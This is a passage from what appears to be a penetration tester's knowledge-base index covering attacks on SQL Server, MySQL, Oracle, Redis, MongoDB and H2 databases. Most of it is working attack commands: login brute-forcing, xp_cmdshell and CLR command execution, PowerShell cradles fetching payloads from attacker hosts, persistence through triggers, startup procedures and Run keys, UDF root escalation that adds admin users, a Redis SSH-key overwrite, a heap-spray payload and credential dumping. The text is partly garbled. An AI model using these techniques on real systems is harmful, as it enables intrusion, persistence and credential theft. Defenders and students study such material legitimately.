https://docs.microsoft.com/en-us/sql/relational-databases/system-catalog-views/sys-database-role-members-transact-sql","title":"Queries"},{"location":"databases-sqlserver/#brute-forcing","text":"Check if current domain user has access to DB Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Verbose Check if another domain user has access to DB runas / noprofile / netonly / user : domain \\ username powershell . exe Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Verbose Fuzzing logins: Get-SQLFuzzServerLogin -Instance ops-mssql \u2013 Verbose -- Above is equivalent to: SELECT SUER_NAME ( 1 ) SELECT SUER_NAME ( 2 ) SELECT SUER_NAME ( 3 ) BruteForce: Get-SQLInstanceDomain | G ) et-SQLConnectionTestThreaded -Username sa -Password Password -Verbose $comps = $( Get-SQLInstanceDomain ). ComputerName comps | Invoke-BruteForce -UserList C : \\ dict \\ users . txt -PasswordList C : \\ dict \\ passwords . txt -Service SQL \u2013 Verbose","title":"Brute-forcing"},{"location":"databases-sqlserver/#command-execution","text":"","title":"Command Execution"},{"location":"databases-sqlserver/#xp_cmdshell","text":"Disabled by default since SQL Server 2005 Executed with the privileges of SQL Server service account Synchronous sysadmin privileges are required If uninstalled: sp_addextendedproc xp_cmdshell , xplog70.dll Execute command: EXEC master .. xp_cmdshell whoami xp_cmdshell powershell iex ( New - Object System . Net . WebClient ). DownloadString ( \\ http://10.10.14.8/shell.ps1\\ ) Enable xp_cmdshell: mssqlclient . py has enable_xp_cmdshell exec sp_configure show advanced options , 1 RECONFIGURE exec sp_configure xp_cmdshell , 1 RECONFIGURE Disable xp_cmdshell exec sp_configure show advanced options , 1 RECONFIGURE exec sp_configure xp_cmdshell , 0 RECONFIGURE Grant permissions to xp_cmdshell - Let's say we have a user that is not a sysadmin, but is a user of the master database and we nt to grant access to run xp_cmdshell: -- add user test to the master database USE [ master ] GO CREATE USER [ test ] FOR LOGIN [ test ] GO -- grant execute access to xp_cmdshell GRANT EXEC ON xp_cmdshell TO [ test ] Nishang: Execute - Command - MSSQL - ComputerName instance - UserName sa - Password pw PowerUpSQL: Invoke - SQLOSCmd - Username sa - Password pw - Instance instance - Command whoami","title":"xp_cmdshell"},{"location":"databases-sqlserver/#custom-extended-stored-procedures","text":"DLL which acts as an extension to SQL server sysadmin privileges are required to register Executes with the privileges of the service account DLL can have any file extension Can also be loaded from UNC path or Webdav Sample DLL Code: https://raw.githubusercontent.com/nullbind/Powershellery/master/Stable-ish/MSSQL/xp_evil_template.cpp https://stackoverflow.com/questions/12749210/how-to-create-a-simple-dll-for-a-custom-sql-server-extended-stored-procedure If xp_calc . dll has a function called xp_calc :\\ sp_addextendedproc xp_calc , C:\\mydll\\xp_calc.dll EXEC xp_calc sp_dropextendedproc xp_calc Create-SQLFileXpDll -OutFile C : \\ fileserver \\ xp_calc . dll -Command calc.exe -ExportName xp_calc Get-SQLQuery -UserName sa -Password pw -Instance instance -Query sp_addextendedproc xp_calc , \\\\192.168.15.2\\fileserver\\xp_calc.dll Get-SQLQuery -UserName sa -Password Password1 -Instance instance -Query EXEC xp_calc Listing existing Custom Extended Stored Procedures: Get-SQLStoredProcedureXP -Instance instance -Verbose","title":"Custom Extended Stored Procedures"},{"location":"databases-sqlserver/#custom-clr-assemblies","text":"CLR ( Common Language Runtime ) is a run-time environment provided by the .NET framework SQL Server CLR integration allows writing stored procedures and other things by importing a DLL. CLR integration is off by default sysadmin privileges are required by-default. Create assembly, alter assembly or DDL_Admin role can also use it. Execution takes place with privileges of the service account DLL can be loaded from a local path or a UNC path References https://docs.microsoft.com/en-us/dotnet/framework/data/adonet/sql/introduction-to-sql-server-clr-integrationv https://blog.netspi.com/attacking-sql-server-clr-assemblies/ Enable CLR: use msdb GO -- Enable show advanced options on the server sp_configure show advanced options , 1 RECONFIGURE GO -- Enable clr on the server sp_configure clr enabled , 1 RECONFIGURE GO Create DLL: C : \\ Windows \\ Microsoft . NET \\ Framework64 \\ v4 . 0 . 30319 \\ csc . exe / target : library C : \\ Users \\ labuser \\ Desktop \\ cmd_exec . cs Create-SQLFileCLRDll -ProcedureName runcmd -OutFile runcmd -OutDir C : \\ Users \\ labuser \\ Desktop Import the assembly from file: CREATE ASSEMBLY my_assembly FROM \\\\192.168.15.2\\fileserver\\cmd_exec.dll WITH PERMISSION_SET = UNSAFE ; GO Import the assembly from string: CREATE ASSEMBLY [ NMfsa ] AUTHORIZATION [ dbo ] FROM 0 x4D5A90 ...... Link the assembly to a stored procedure CREATE PROCEDURE [ dbo ].[ cmd_exec ] @ execCommand NVARCHAR ( 4000 ) AS EXTERNAL NAME [ my_assembly ].[ StoredProcedures ].[ cmd_exec ]; GO Execution: cmd_exec whoami Invoke-SQLOSCmdCLR -Username sa -Password pw -Instance instance -Command whoami -Verbose Cleanup: DROP PROCEDURE cmd_exec DROP ASSEMBLY my_assembly List all CLR assemblies: Get-SQLStoredProcedureCLR -Instance instance -Verbose","title":"Custom CLR Assemblies"},{"location":"databases-sqlserver/#ole-automation-procedure","text":"Disabled by default sysadmin privileges are required by-default. Execution takes place with privileges of the service account Execute privileges on sp_OACreate and sp_OAMethod can also be used for execution. References: https://docs.microsoft.com/en-us/sql/database-engine/configure-windows/ole-automation-procedures-server-configuration-option Enabling: sp_configure show advanced options , 1 ; GO RECONFIGURE ; GO sp_configure Ole Automation Procedures , 1 ; GO RECONFIGURE ; GO Execute: DECLARE @ output INT DECLARE @ ProgramToRun VARCHAR ( 255 ) SET @ ProgramToRun = Run( calc.exe ) EXEC sp_oacreate wScript.Shell , @ output out EXEC sp_oamethod @ output , @ ProgramToRun EXEC sp_oadestroy @ output Invoke-SQLOSCmdCLR -Username sa -Password pw -Instance instance -Command whoami -Verbose Example: Sets SecurityDescriptor of ftp.exe to everyone: https://malwaremusings.com/2013/04/10/a-look-at-some-ms-sql-attacks-overview/ -- Declare variables used to reference the objects DECLARE @ objLocator int , @ objWmi int , @ objPermiss int , @ objFull int ; -- Create a WbemScripting.SWbemLocator object EXEC sp_OACreate WbemScripting.SWbemLocator , @ objLocator OUTPUT ; -- Use the SWbemLocator object s ConnectServer() method to connect to the -- local WMI server. The connection will be to the root\\cimv2 namespace EXEC sp_OAMethod @ objLocator , ConnectServer , @ objWmi OUTPUT , . , root\\cimv2 ; -- Retrieve an SWbemObject that represents the requested object -- In this case, a Win32_LogicalFileSecuritySetting object for ftp.exe EXEC sp_OAMethod @ objWmi , Get , @ objPermiss OUTPUT , Win32_LogicalFileSecuritySetting.Path= ftp.exe ; -- Create an empty SecurityDescriptor EXEC sp_OAMethod @ objWmi , Get , @ objFull OUTPUT , Win32_SecurityDescriptor ; -- Set the SecurityDescriptor s ControlFlags property to -- 4 (SE_DACL_PRESENT) EXEC sp_OASetProperty @ objFull , ControlFlags , 4 ; -- Set the file security setting object s security descriptor to the new -- SecurityDescriptor object EXEC sp_OAMethod @ objPermiss , SetSecurityDescriptor , NULL , @ objFull ;","title":"OLE Automation Procedure"},{"location":"databases-sqlserver/#agent-jobs-cmdexec-powershell-activex-etc","text":"Job can be scheduled, executed in response to alerts or by using sp_start_job stored procedure Needs sysadmin role to create a job. Non-sysadmin users with the SQLAgentUserRole , SQLAgentReaderRole , and SQLAgentOperatorRole fixed database roles in the msdb database can also be used. The execution takes place with privileges of the SQL Server Agent service account if a proxy account is not configured. References: https://docs.microsoft.com/en-us/sql/ssms/agent/sql-server-agent https://serverfault.com/a/14569 https://www.optiv.com/blog/mssql-agent-jobs-for-command-execution Steps xp_startservice - Start the SQL Server Agent service sp_add_job - Create Job sp_add_jobstep - Add job step sp_start_job - Run Job sp_delete_job - Delete Job Listing all Jobs** SELECT job . job_id , notify_level_email , name , enabled , description , step_name , command , server , database_name FROM msdb . dbo . sysjobs job INNER JOIN msdb . dbo . sysjobsteps steps ON job . job_id = steps . job_id Interesting subsystems (job types): PowerShell USE msdb EXEC dbo . sp_add_job @ job_name = N PSJob EXEC sp_add_jobstep @ job_name = N PSJob , @ step_name = N test_powershell_name1 , @ subsystem = N PowerShell , @ command = N powershell.exe -noexit ps , @ retry_attempts = 1 , @ retry_interval = 5 EXEC dbo . sp_add_jobserver @ job_name = N PSJob EXEC dbo . sp_start_job N PSJob -- EXEC dbo.sp_delete_job @job_name = N PSJob CmdExec USE msdb EXEC dbo . sp_add_job @ job_name = N cmdjob EXEC sp_add_jobstep @ job_name = N cmdjob , @ step_name = N test_cmd_name1 , @ subsystem = N cmdexec , @ command = N cmd.exe /k calc , @ retry_attempts = 1 , @ retry_interval = 5 EXEC dbo . sp_add_jobserver @ job_name = N cmdjob EXEC dbo . sp_start_job N cmdjob ; -- EXEC dbo.sp_delete_job @job_name = N cmdJob Microsoft ActiveX Script (VBScript and Jscript) SSIS (SQL Server Integrated Services) PowerUpSQL Invoke-SQLOSCmdAgentJob \u2013 Subsystem PowerShell -Username sa -Password pw -Instance instance -Command powershell -e base64encodedscript -Verbose -Subsystem CmdExec -ubsystem VBScript -Subsystem Jscript Get-SQLAgentJob -Instance instance -username sa -Password pw -Verboe ] se","title":"Agent Jobs (CmdExec, PowerShell, ActiveX etc.)"},{"location":"databases-sqlserver/#external-scripting","text":"R introduced in SQL Server 2016 Python introduced in SQL Server 2017 Runtime environments must be installed as a prerequisite. Not on by default. Needs SQL server service restart. Needs sysadmin privileges to be enabled and executed. Runs with privileges of a dynamically created Windows user account (member of the SQLRUserGroup ). References: https://docs.microsoft.com/en-us/sql/advanced-analytics/tutorials/rtsql-using-r-code-in-transact-sql-quickstart https://www.slideshare.net/nullbind/beyond-xpcmdshell-owning-the-empire-through-sql-server https://gist.github.com/james-otten/63389189ee73376268c5eb676946ada5 https://www.slideshare.net/nullbind/beyond-xpcmdshell-owning-the-empire-through-sql-server Executing commands with R: sp_configure external scripts enabled GO EXEC sp_execute_external_script @ language = N R , @ script = N OutputDataSet - data.frame(system( cmd.exe /c dir ,intern=T)) WITH RESULT SETS (([ cmd_out ] text )); GO Grab Net-NTLM hashes with R: @ script = N .libPaths( \\\\\\\\testhost\\\\foo\\\\bar );library( 0mgh4x ) Using shell instead of system: https://pastebin.com/zBDnzELT @ script = N OutputDataSet - data.frame(shell( dir ,intern=T)) Executing commands with Python: EXEC sp_execute_external_script @ language = N Python , @ script = N import subprocess p = subprocess.Popen( cmd.exe /c whoami , stdout=subprocess.PIPE) OutputDataSet = pandas.DataFrame([str(p.stdout.read(), utf-8 )]) WITH RESULT SETS (([ cmd_out ] nvarchar ( max ))) PowerUpSQL: Invoke-SQLOSCmdR -Username sa -Password pw -Instance instance -Command powershell -e base64encodedscript -Verbose Invoke-SQLOSCmdPython -Username sa -Password pw -Instance instance -Command powershell -e base64encodedscript -Verbose","title":"External Scripting"},{"location":"databases-sqlserver/#registry-autoruns","text":"","title":"Registry Autoruns"},{"location":"databases-sqlserver/#file-autoruns","text":"","title":"File Autoruns"},{"location":"databases-sqlserver/#privilege-escalation","text":"","title":"Privilege Escalation"},{"location":"databases-sqlserver/#find-impersonatable-accounts","text":"https://blog.netspi.com/hacking-sql-server-stored-procedures-part-2-user-impersonation/ SELECT distinct b . name FROM sys . server_permissions a INNER JOIN sys . server_principals b ON a . grantor_principal_id = b . principal_id WHERE a . permission_name = IMPERSONATE Invoke-SQLAuditPrivImpersonateLogin -Username un -Password pw -Instance dbname -Verbose","title":"Find Impersonatable Accounts"},{"location":"databases-sqlserver/#execute-as","text":"https://docs.microsoft.com/en-us/sql/t-sql/statements/execute-as-transact-sql EXECUTE AS LOGIN = dbadmin SELECT SYSTEM_USER SELECT IS_SRVROLEMEMBER ( sysadmin ) EXECUTE AS LOGIN = dbadmin SELECT SYSTEM_USER SELECT IS_SRVROLEMEMBER ( sysadmin ) SELECT ORIGINAL_LOGIN () EXECUTE AS LOGIN = sa SELECT SYSTEM_USER SELECT IS_SRVROLEMEMBER ( sysadmin ) SELECT ORIGINAL_LOGIN ()","title":"Execute As"},{"location":"databases-sqlserver/#trustworthy-databases","text":"https://docs.microsoft.com/en-us/sql/relational-databases/security/trustworthy-database-property http://sqlity.net/en/1653/the-trustworthy-database-property-explained-part-1/ is_trustworthy_off by default (Only a sysadmin can change). When off impersonated users will only have database-scope permissions. When on impersonated users can perform actions with server level permissions. Allows writing procedures that can execute code with server level permission. If is_trustworthy_on and if a sysadmin (not necessarily sa ) is owner of the database, it is possible for the database owner (a user with db_owner ) to elevate privileges to sysadmin . Discover Trustworthy Databases SELECT name as database_name , SUSER_NAME ( owner_sid ) AS database_owner , is_trustworthy_on AS TRUSTWORTHY from sys . databases Invoke-SQLAudit -Instance instance-name -Verbose | Out-GridView Invoke-SQLAuditPrivTrustworthy -Instance instance-name -Verbose Exploitation Add sysadmin to myuser : EXECUTE AS USER = dbo SELECT system_user EXEC sp_addsrvrolemember example.com\\myuser , sysadmin","title":"Trustworthy Databases"},{"location":"databases-sqlserver/#public-to-service-account","text":"UNC Path Injection Capture Net-NTLM (also known as NTLMv1/v2) hashes Stored procedures like xp_dirtree and xp_fileexist can be used to capture Net-NTLM hashes UNC Path Injection cheatsheet: https://gist.github.com/nullbind/7dfca2a6309a4209b5aeef181b676c6e Invoke-SQLUncPathInjection -Verbose -CaptureIp 192 . 168 . 1 . 11","title":"Public to Service Account"},{"location":"databases-sqlserver/#service-account-to-system","text":"Rotten Potato https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/ Trick the \"NT AUTHORITY\\SYSTEM\" account into authenticating via NTLM to a TCP endpoint attacker control. Man-in-the-middle this authentication attempt (NTLM relay) to locally negotiate a security token for the \u201cNT AUTHORITY\\SYSTEM\u201d account Impersonate the token we have just negotiated. Usable only if attackers current account has the privilege to impersonate security tokens. Extracting service account credentials from LSA Secrets and/or memory Token Impersonation for the SQL Server service Single user mode","title":"Service Account to System"},{"location":"databases-sqlserver/#lateral-movement","text":"","title":"Lateral Movement"},{"location":"databases-sqlserver/#domain-user-accounts","text":"SQL server allows Domain user logins (it a part of the domain trust) Once domain user access is present, enumerate privileges it has on SQL servers in the domain After gaining shell access to the user (command execution) following can be done: Check if current user has access to SQL Servers in domain: Get - SQLInstanceDomain | Get - SQLServerInfo - Verbose For alternative credentials: runas / noprofile / netonly / user : domain \\ username powershell . exe A user with public access can be used to enumerate domain accounts and groups in the forest and other trusted forests: Get - SQLFuzzDomainAccount - Instance instance - StartId 500 - EndId 2000 - Verbose If local admin rights are present, dump credentials. References: https://blog.netspi.com/hacking-sql-server-procedures-part-4-enumerating-domain-accounts/","title":"Domain User accounts"},{"location":"databases-sqlserver/#database-links","text":"Allows a SQL Server to access external data sources (SQL Servers, OLE DB) If SQL Servers are linked: Can execute stored procedures Work across SQL server versions and forests References: https://docs.microsoft.com/en-us/sql/relational-databases/linked-servers/linked-servers-database-engine http://www.labofapenetrationtester.com/2017/03/using-sql-server-for-attacking-forest-trust.html Search for linked databases: select - from master .. sysservers Get - SQLServerLink - Instance instance - Verbose Run queries on linked databases: select - from openquery ( instance , select - frommaster..sysservers ) Run queries on chain of linked databases: select - from openquery ( inatance1 , select - from openquery( instance2 , select - from master..sysservers ) ) Get-SQLServerLinkCrawl -Instance instance1 -Verbose If rpcout is enabled for all links (disabled by default), xp_cmdshell can be enabled using: EXECUTE ( sp_configure xp_cmdshell ,1;reconfigure; ) AT instance2 ) Command execution with linked databases: select - from openquery ( instance1 , select - from openquery( instance2 , select - from openquery( instance3 , select @@version as version;exec master..xp_cmdshell cmd /c calc.exe ) ) ) Get-SQLServerLinkCrawl -Instance instance1 -Query exec master..xp_cmdshell cmd /c calc.exe -Verbose Decrypting Database Link Server Passwords: https://blog.netspi.com/decrypting-mssql-database-link-server-passwords/","title":"Database Links"},{"location":"databases-sqlserver/#persistence","text":"","title":"Persistence"},{"location":"databases-sqlserver/#startup-stored-procedures","text":"sysadmin privileges are required to mark proc for automated execution Owned only by sa Must be in the master database Cannot have input or output parameters Gets executed with sysadmin privileges Executed when SQL Server restart References: https://technet.microsoft.com/en-us/library/ms191129(v=sql.105).aspx https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/sp-procoption-transact-sql https://blog.netspi.com/sql-server-persistence-part-1-startup-stored-procedures/ Create: USE master GO CREATE PROCEDURE sp_autops AS EXEC master .. xp_cmdshell powershell -C iex (new-object System.Net.WebClient).DownloadString( http://webserver/payload.ps1 ) GO EXEC sp_procoption @ ProcName = sp_autops , @ OptionName = startup , @ OptionValue = on ; List: SELECT [ name ] FROM sysobjects WHERE type = P AND OBJECTPROPERTY ( id , ExecIsStartUp ) = 1 ;","title":"Startup stored procedures"},{"location":"databases-sqlserver/#triggers","text":"References: https://docs.microsoft.com/en-us/sql/t-sql/statements/create-trigger-transact-sql","title":"Triggers"},{"location":"databases-sqlserver/#data-definition-language-ddl-triggers","text":"Execute under the context of the user that calls the trigger References: https://blog.netspi.com/maintaining-persistence-via-sql-server-part-2-triggers/ https://docs.microsoft.com/en-us/sql/relational-databases/triggers/implement-ddl-triggers https://docs.microsoft.com/en-us/sql/relational-databases/triggers/ddl-event-groups CREATE Trigger [ persistence_ddl_1 ] ON ALL Server -- or DATABASE FOR DDL_LOGIN_EVENTS -- See the docs below for events and event groups AS EXEC master .. xp_cmdshell powershell -C iex (new-object System.Net.WebClient).DownloadString( http://webserver/payload.ps1 ) GO","title":"Data Definition Language (DDL) Triggers"},{"location":"databases-sqlserver/#data-manipulation-language-dml-triggers","text":"Execute under the context of the user that calls the trigger User should have privilages to do the task in the trigger References: https://blog.netspi.com/maintaining-persistence-via-sql-server-part-2-triggers/ https://docs.microsoft.com/en-us/sql/relational-databases/triggers/create-dml-triggers USE master GRANT IMPERSONATE ON LOGIN :: sa to [ Public ]; USE testdb CREATE TRIGGER [ persistence_dml_1 ] ON testdb . dbo . datatable FOR INSERT , UPDATE , DELETE AS EXECUTE AS LOGIN = sa EXEC master .. xp_cmdshell powershell -C iex (new-object System.Net.WebClient).DownloadString( http://webserver/payload.ps1 ) GO","title":"Data Manipulation Language (DML) Triggers"},{"location":"databases-sqlserver/#logon-triggers","text":"Ideal for triggering with a logon failure of a low-privilege user. References: https://docs.microsoft.com/en-us/sql/relational-databases/triggers/logon-triggers CREATE Trigger [ persistence_logon_1 ] ON ALL SERVER WITH EXECUTE AS sa FOR LOGON AS BEGIN IF ORIGINAL_LOGIN () = testuser EXEC master .. xp_cmdshell powershell -C iex (new-object System.Net.WebClient).DownloadString( http://webserver/payload.ps1 ) END ; List all Triggers SELECT - FROM sys . server_triggers Get-SQLTriggerDdl -Instance instance -username sa -Password pw -Verbose","title":"Logon Triggers"},{"location":"databases-sqlserver/#registry-keys","text":"xp_regwrite Needs sysadmin EXEC xp_regwrite @ rootkey = HKEY_LOCAL_MACHINE , @ key = Software\\Microsoft\\Windows\\CurrentVersion\\Run , @ value_name = SQLServerUpdate , @ type = REG_SZ , @ value = powershell -w 1 -NoP -NoL iex(New-Object Net.WebClient).DownloadString( http://webserver/evil.ps1 ) Get-SQLPersistRegDebugger -Instance instance -username sa -Password pw -FileName utilman . exe -Command c:\\windows\\system32\\cmd.exe -Verbose Get-SQLPersistRegRun -Instance instance -username sa -Password pw -Name SQLUpdate -Command powershell -w 1 -NoP -NoL iex(New-Object Net.WebClient).DownloadString( http://webserver/evil.ps1 ) -Verbose xp_regread Limited read for public role References: https://blog.netspi.com/get-windows-auto-login-passwords-via-sql-server-powerupsql/ DECLARE @ Reg_Value VARCHAR ( 1000 ) EXECUTE xp_regread HKEY_LOCAL_MACHINE , SOFTWARE\\Microsoft\\WindowsNT\\CurrentVersion\\CurrentVersion , \u2018 ProductName , @ Reg_Value OUTPUT SELECT @ Reg_Value Read auto-login password: Get-SQLRecoverPwAutoLogon -Instance instance -username sa -Password pw -Verbose xp_regdeletekey Needs sysadmin References: https://support.microsoft.com/en-us/help/887165/bug-you-may-receive-an-access-is-denied-error-message-when-a-query-cal","title":"Registry keys"},{"location":"databases-sqlserver/#defence","text":"Audit links, trusts, privileges and credentials. Service Accounts for databases should not be high privilege domain account. Known dangerous Stored Procedures are disabled. Use audit features to log interesting events. Monitor the logs ( Management Studio - Management - SQL Server Logs ) Error log @ Program - Files \\ Microsoft SQL Server \\ MSSQL . 1 MSSQL \\ LOG \\ ERRORLOG Logs are also written to Windows Application logs with MSSQLSERVER as source. Good password policy. Not using same username across databases. Logon failures are logged by default (source MSSQLSERVER ). Event ID Description 18456 Authentication failures 5084 Setting TRUSTWORTHY to on/off 17135 Launch of startup stored procedures 33090 Successful DLL loading 17750 Failed DLL loading 15457 Using sp_configure (command execution)","title":"Defence"},{"location":"databases-sqlserver/#references","text":"https://blog.anitian.com/hacking-microsoft-sql-server-without-a-password/ https://blog.anitian.com/hacking-sql-servers-without-password/","title":"References"},{"location":"databases/","text":"Databases - SqlServer Tools NoSQLMap - https://github.com/codingo/NoSQLMap SQLMap - http://sqlmap.org/ SqlServer Moved to dedicated section at https://kbase.ayoma.me/databases-sqlserver/ MongoDB Connect: mongo - p - u $ USER $ DB_NAME RCE: https://cxsecurity.com/issue/WLB-2013030212 db . my_collection . find ({ $where : shellcode=unescape( METASPLOIT JS GENERATED SHELLCODE ); sizechunk=0x1000; chunk= ; for(i=0;i sizechunk;i++){ chunk+=unescape( %u9090%u9090 ); } chunk=chunk.substring(0,(sizechunk-shellcode.length)); testarray=new Array(); for(i=0;i 25000;i++){ testarray[i]=chunk+shellcode; } ropchain=unescape( %uf768%u0816%u0c0c%u0c0c%u0000%u0c0c%u1000%u0000%u0007%u0000%u0031%u0000%uffff%uffff%u0000%u0000 ); sizechunk2=0x1000; chunk2= ; for(i=0;i sizechunk2;i++){ chunk2+=unescape( %u5a70%u0805 ); } chunk2=chunk2.substring(0,(sizechunk2-ropchain.length)); testarray2=new Array(); for(i=0;i 25000;i++){ testarray2[i]=chunk2+ropchain; } nativeHelper.apply({ x : 0x836e204}, [ A + \\x26\\x18\\x35\\x08 + MongoSploit! + \\x58\\x71\\x45\\x08 + sthack is a nice place to be + \\x6c\\x5a\\x05\\x08 + \\x20\\x20\\x20\\x20 + \\x58\\x71\\x45\\x08 ]); }) References: - https://blog.websecurify.com/2014/08/hacking-nodejs-and-mongodb.html Microsoft Access MDB Tools - Read Access databases on *nix: https://github.com/brianb/mdbtools mdb-tables backup.mdb | grep --color = auto user mdb-export backup.mdb tableName H2 RCE: CREATE \u200b \u200b ALIAS \u200b SHELLEXEC \u200b AS \u200b $$ \u200b String \u200b shellexec ( \u200b String \u200b cmd ) throws java . io . IOException { java . util . Scanner s = \u200b new java . util . Scanner ( Runtime . getRuntime (). exec ( cmd ). getInputStream ()). useDelim iter ( \u200b \\\\A \u200b ); return s . hasNext () ? s . next () : ; }$$ ; CALL \u200b SHELLEXEC ( \u200b id \u200b ) Redis Redis-tools: sudo apt - get install redis - tools http://antirez.com/news/96 Connect and basic query: redis-cli -h 10 .10.10.160 10 .10.10.160:6379 dbsize ( integer ) 0 ( 0 .51s ) 10 .10.10.160:6379 CONFIG GET databases 1 ) databases 2 ) 16 ( 0 .63s ) 10 .10.10.160:6379 INFO keyspace # Keyspace ( 0 .56s ) 10 .10.10.160:6379 INFO Write to authorized_keys file: ssh-keygen -f redis echo -ne \\n\\n public ; cat redis.pub public redis-cli -h 10 .10.10.160 SLAVEOF NO ONE cat public | redis-cli -h 10 .10.10.160 -x set pub redis-cli -h 10 .10.10.160 CONFIG SET dir /var/lib/redis/.ssh redis-cli -h 10 .10.10.160 CONFIG SET dbfilename authorized_keys redis-cli -h 10 .10.10.160 SAVE Sqlte Dump entire database: sqlite3 some.db .schema schema.sql sqlite3 some.db .dump dump.sql grep -vx -f schema.sql dump.sql data.sql Dump into CSV . mode csv -- use .separator SOME_STRING for something other than a comma. . headers on . out file . csv select * from MyTable ; Insert into SQL: . mode insert target_table_name . out file . sql select * from MyTable ; MySQL Bruteforce: hydra - l root - P / path / to / wordlist . txt ( TARGET IP ADDRESS ) mysql Connection tests mysql - h Hostname - u root mysql - h Hostname - u root mysql - h Hostname - u root @ localhost mysql - h Hostname mysql - h Hostname - u @ localhost mysql - u john - phiroshima - e show databases mysql - u john - phiroshima - D webapp - e show tables Configuration files: Windows config.ini my.ini windows\\my.ini winnt\\my.ini /mysql/data/ UNIX /etc/my.cnf /etc/mysql/my.cnf /var/lib/mysql/my.cnf ~/.my.cnf /etc/my.cnf Command history: ~/.mysql.history Log files: connections.log update.log common.log Privilege Escalation Current access level: mysql select user (); mysql select user , password , create_priv , insert_priv , update_priv , alter_priv , delete_priv , drop_priv from user where user = OUTPUT OF select user() ; Access passwords: mysql use mysql mysql select user , password from user ; Create new user and grant permissions: mysql create user test identified by test ; mysql grant SELECT , CREATE , DROP , UPDATE , DELETE , INSERT on * . * to mysql identified by mysql WITH GRANT OPTION ; Break into shell: mysql \\ ! cat / etc / passwd mysql \\ ! bash MySQL root to system root MySQL Root to System Root with lib_mysqludf_sys for Windows and Linux Take lib from SQLMap and dump it into the server: udf / mysql / linux / 32 / lib_mysqludf_sys . so udf / mysql / linux / 64 / lib_mysqludf_sys . so udf / mysql / windows / 32 / lib_mysqludf_sys . dll udf / mysql / windows / 64 / lib_mysqludf_sys . dll On Windows: USE mysql ; CREATE TABLE npn ( line blob ); INSERT INTO npn values ( load_file ( C://xampplite//htdocs//mail//lib_mysqludf_sys.dll )); SELECT * FROM mysql . npn INTO DUMPFILE c://windows//system32//lib_mysqludf_sys_32.dll ; CREATE FUNCTION sys_exec RETURNS integer SONAME lib_mysqludf_sys_32.dll ; SELECT sys_exec ( net user npn npn12345678 /add ); SELECT sys_exec ( net localgroup Administrators npn /add ); On Linux: use mysql ; create table npn ( line blob ); insert into npn values ( load_file ( /home/npn/lib_mysqludf_sys.so )); select * from npn into dumpfile /usr/lib/lib_mysqludf_sys.so ; create function sys_exec returns integer soname lib_mysqludf_sys.so ; select sys_exec ( id /tmp/out; chown npn.npn /tmp/out ); npn @ pwn : ~ $ cat / tmp / out uid = 0 ( root ) gid = 0 ( root ) groups = 0 ( root ), 1 ( bin ), 2 ( daemon ), 3 ( sys ), 4 ( adm ) // Create a shell , compile it , chmod +s /tmp/shell and get reverse shell #include stdio.h #include sys/types.h #include unistd.h int main ( void ) { setuid ( 0 ); setgid ( 0 ); system ( \u201c / bin / bash \u201d ); } gcc -o /tmp/shell /home/npn/shell.c chmod +s /tmp/shell Oracle RCE Add permissions (sqlPlus required): DECLARE l_schema VARCHAR2 ( 30 ) : = SYSTEM ; BEGIN DBMS_JAVA . grant_permission ( l_schema , java.io.FilePermission , ALL FILES , read ,write, execute, delete ); DBMS_JAVA . grant_permission ( l_schema , SYS:java.lang.RuntimePermission , writeFileDescriptor , ); DBMS_JAVA . grant_permission ( l_schema , SYS:java.lang.RuntimePermission , readFileDescriptor , ); END ; / Java code: CREATE OR REPLACE AND RESOLVE JAVA SOURCE NAMED pwn AS import java . lang . * ; import java . io . * ; public class pwn { public static void cmd ( String command ) throws IOException { Runtime . getRuntime (). exec ( command ); } } ; / Create procedure: CREATE OR REPLACE PROCEDURE pwn_cmd ( p_command IN VARCHAR2 ) AS LANGUAGE JAVA NAME pwn.cmd (java.lang.String) ; / Run command: exec pwn_cmd ( net user trevelyn trevelyn /add ); exec pwn_cmd ( net localgroup Administrators trevelyn /add ); exec pwn_cmd ( cmd.exe /c echo open X.X.X.X C:\\ftp.txt ); Tools Oracle Database Attack Tool (ODAT) https://github.com/quentinhardy/odat All checks : . / odat . py all - s 10 . 10 . 10 . 82 - p 1521 . / odat . py all - s 10 . 10 . 10 . 82 - d XE - U scott - P tiger Gusss SID : . / odat . py sidguesser - s 10 . 10 . 10 . 82 Guess passwords : . / odat . py passwordguesser - d XE - s 10 . 10 . 10 . 82 - p 1521 -- accounts - file / root / HTB / tools / db / odat / accounts / accounts . txt Guess login : use admin / oracle / oracle_login Upload file : . / odat . py utlfile - d XE - s 10 . 10 . 10 . 82 - p 1521 - U scott - P tiger -- sysdba -- putFile c : / writeup . exe ~/ HTB / silo / writeup . exe . / odat . py dbmsxslprocessor - d XE - s 10 . 10 . 10 . 82 - p 1521 - U scott - P tiger -- putFile c: \\\\ inetpub \\\\ wwwroot File-Test.txt /tmp/File-Test.txt Execute file : . / odat . py externaltable - d XE - s 10 . 10 . 10 . 82 - p 1521 - U scott - P tiger -- sysdba -- exec c : / writeup . exe Nmap nmap --script oracle-sid-brute (TARGET IP ADDRESS) -p 1521 oscanner oscanner - s ( TARGET IP ADDRESS ) Queries Get all usernames and password: SELECT Username || : || PASSWORD AS credentials FROM DBA_USERS ; DB Version: SELECT * FROM V$VERSION List all tables owned by user: SELECT table_name FROM user_tables ; Get current DB user: SELECT NAME FROM v$database ; References https://medium.com/@netscylla/pentesters-guide-to-oracle-hacking-1dcf7068d573","title":"Databases - SqlServer"},{"location":"databases/#databases-sqlserver","text":"","title":"Databases - SqlServer"},{"location":"databases/#tools","text":"NoSQLMap - https://github.com/codingo/NoSQLMap SQLMap - http://sqlmap.org/","title":"Tools"},{"location":"databases/#sqlserver","text":"Moved to dedicated section at https://kbase.ayoma.me/databases-sqlserver/","title":"SqlServer"},{"location":"databases/#mongodb","text":"Connect: mongo - p - u $ USER $ DB_NAME RCE: https://cxsecurity.com/issue/WLB-2013030212 db . my_collection . find ({ $where : shellcode=unescape( METASPLOIT JS GENERATED SHELLCODE ); sizechunk=0x1000; chunk= ; for(i=0;i sizechunk;i++){ chunk+=unescape( %u9090%u9090 ); } chunk=chunk.substring(0,(sizechunk-shellcode.length)); testarray=new Array(); for(i=0;i 25000;i++){ testarray[i]=chunk+shellcode; } ropchain=unescape( %uf768%u0816%u0c0c%u0c0c%u0000%u0c0c%u1000%u0000%u0007%u0000%u0031%u0000%uffff%uffff%u0000%u0000 ); sizechunk2=0x1000; chunk2= ; for(i=0;i sizechunk2;i++){ 